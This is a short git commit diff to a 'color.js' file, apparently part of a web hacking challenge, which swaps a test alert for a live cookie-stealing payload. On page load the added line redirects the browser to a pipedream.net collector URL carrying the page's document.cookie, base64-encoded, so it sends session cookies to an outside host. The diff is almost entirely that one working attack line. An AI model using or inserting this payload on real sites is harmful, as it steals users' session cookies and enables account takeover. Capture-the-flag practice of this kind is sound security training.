086f0d5475ca20c694c8a03d1986e20d7ed48204
Neco-Arc-gif <melvyn.saksik@gmail.com>
2025-01-29 19:32:59 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,6 +1,4 @@
 // Note: This is for a web hacking challenge, please don't try to interact with anything beside the website
 document.addEventListener('DOMContentLoaded', () => {
-    alert('CSP Bypass Successful!');
+    window.location="https://eotoci65n24zl7e.m.pipedream.net/"+btoa(document.cookie); 
 });
-
-//window.location="https://eotoci65n24zl7e.m.pipedream.net/"+btoa(document.cookie); 
